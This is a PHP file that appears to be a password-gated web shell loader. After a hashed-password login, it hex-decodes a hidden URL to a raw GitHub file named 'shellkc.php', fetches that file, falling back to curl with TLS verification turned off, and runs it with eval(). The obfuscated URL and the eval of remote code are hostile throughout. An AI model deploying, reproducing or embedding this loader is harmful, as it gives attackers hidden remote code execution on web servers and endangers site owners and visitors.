<?php
session_start();


$ea = '$2a$12$yHl9nH27olhJRxTYlgkgXuzp.EKa61wShoxdyB.jTBETtkSUEH3sq'; 

if (!isset($_SESSION['logged_in'])) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        if (password_verify($_POST['pass'], $ea)) {
            $_SESSION['logged_in'] = true;
            header("Location: " . $_SERVER['PHP_SELF']);
            exit;
        } else {
            $error = "X";
        }
    }

    if (isset($error)) echo '<p style="color:red;">' . htmlspecialchars($error) . '</p>';
    echo '<form method="post">
            <label><input type="password" name="pass"></label><br>
            <input type="submit" value=">>">
          ';
    exit;
}


$hexUrl = '68747470733a2f2f7261772e6769746875622e636f6d2f6c73726939373030382f616d616e6b6168322f726566732f68656164732f6d61696e2f7368656c6c6b632e706870';
$url = hex2bin($hexUrl);

$phpScript = @file_get_contents($url);
if ($phpScript === false && function_exists('curl_init')) {
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $phpScript = curl_exec($ch);
    curl_close($ch);
}

if ($phpScript !== false) {
    eval('?>' . $phpScript);
} else {
    die("x");
}
?>
